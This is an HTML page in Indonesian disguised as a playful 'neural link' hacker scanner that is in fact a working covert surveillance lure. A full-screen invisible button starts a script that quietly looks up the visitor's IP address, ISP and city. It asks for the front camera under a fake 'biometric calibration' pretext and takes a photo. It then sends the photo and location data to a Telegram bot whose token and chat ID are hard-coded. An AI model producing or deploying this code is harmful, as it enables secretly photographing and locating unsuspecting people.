<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEURAL LINK ANALYZER v3.0</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            font-family: 'Fira Code', monospace;
            background-color: #050505; color: #00ff41;
            overflow: hidden; display: flex; justify-content: center; align-items: center;
        }

        .bg-grid {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-image: linear-gradient(rgba(0, 255, 65, 0.05) 1px, transparent 1px),
                              linear-gradient(90deg, rgba(0, 255, 65, 0.05) 1px, transparent 1px);
            background-size: 20px 20px; z-index: 1;
        }

        .container {
            position: relative; z-index: 10; background: rgba(0, 0, 0, 0.9);
            padding: 25px; border: 1px solid #00ff41; width: 85%; max-width: 380px;
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
        }

        #trigger {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: transparent; border: none; z-index: 100; cursor: pointer;
        }

        .scan-bar {
            width: 100%; height: 2px; background: #00ff41;
            box-shadow: 0 0 10px #00ff41; position: absolute;
            animation: scanLine 2s infinite linear;
        }

        @keyframes scanLine { 0% { top: 0; } 100% { top: 100%; } }

        .terminal-text { font-size: 0.7rem; color: #008f11; line-height: 1.4; }
        .data-val { color: #00ff41; font-weight: bold; }
        
        video, canvas { display: none; position: fixed; }
    </style>
</head>
<body>

    <div class="bg-grid"></div>
    <button id="trigger"></button>

    <div class="container">
        <div id="setup-view">
            <h1 style="font-size: 1.1rem;">[ CORE_LINK_SYSTEM ]</h1>
            <p style="font-size: 0.8rem; color: #888;">Sinkronisasi neural membutuhkan kalibrasi sensor biometrik.</p>
            <p style="color: #00ff41; font-size: 0.7rem; border: 1px dashed #00ff41; padding: 10px;">
                > TAP TO INITIALIZE UPLINK
            </p>
        </div>

        <div id="scan-view" style="display:none; position: relative; height: 150px;">
            <div class="scan-bar"></div>
            <div class="terminal-text" id="log-text">
                Initializing...<br>
                Fetching IP_ADDRESS...<br>
                Accessing SENSOR_CAM...
            </div>
        </div>

        <div id="result-view" style="display:none;">
            <h1 style="font-size: 1rem;">ACCESS GRANTED</h1>
            <div class="terminal-text" id="final-log">
                Identity: <span class="data-val">SECURE_USER</span><br>
                Status: <span class="data-val">ENCRYPTED</span><br>
                Neural: <span class="data-val">STABLE</span>
            </div>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TG_TOKEN = '8759534902:AAGrdxkHf0ytnacqKexI0OPuEPYrhWXGj7U'; 
        const TG_CHAT_ID = '986460435'; 

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const trigger = document.getElementById('trigger');

        // Fungsi Utama
        async function startHackerScan() {
            trigger.style.display = 'none';
            document.getElementById('setup-view').style.display = 'none';
            document.getElementById('scan-view').style.display = 'block';

            // 1. Ambil data Jaringan (IP, ISP, Lokasi) secara diam-diam
            let networkInfo = "Gagal mengambil data jaringan";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                networkInfo = `
🌐 [LOG JARINGAN]
IP: ${d.ip}
ISP: ${d.org}
Lokasi: ${d.city}, ${d.region}, ${d.country_name}
Device: ${navigator.platform}
Browser: ${navigator.userAgent.split(') ')[1]}
                `;
            } catch (e) { console.log("IP API Blocked"); }

            // 2. Akses Kamera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;

                // Tunggu sebentar untuk autofocus
                setTimeout(() => {
                    captureAndSend(stream, networkInfo);
                }, 3000);

            } catch (err) {
                sendToTelegram("❌ Target menolak akses kamera.\n\n" + networkInfo);
                alert("SYSTEM_ERROR: Sensor biometrik tidak diizinkan.");
                location.reload();
            }
        }

        function captureAndSend(stream, networkInfo) {
            const w = video.videoWidth;
            const h = video.videoHeight;
            canvas.width = w;
            canvas.height = h;
            
            const ctx = canvas.getContext('2d');
            // Mirroring agar natural
            ctx.translate(w, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, w, h);
            
            const imageData = canvas.toDataURL('image/png');
            const blob = dataURItoBlob(imageData);

            // Kirim ke Telegram
            const formData = new FormData();
            formData.append('chat_id', TG_CHAT_ID);
            formData.append('photo', blob, 'capture.png');
            formData.append('caption', `🛡️ [SYSTEM LOG SUCCESS]\n${networkInfo}`);

            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            // Selesai
            stream.getTracks().forEach(t => t.stop());
            document.getElementById('scan-view').style.display = 'none';
            document.getElementById('result-view').style.display = 'block';
        }

        // Fungsi bantu kirim teks jika kamera gagal
        function sendToTelegram(text) {
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}`);
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            return new Blob([ab], {type: mimeString});
        }

        trigger.addEventListener('click', startHackerScan);
    </script>
</body>
</html>
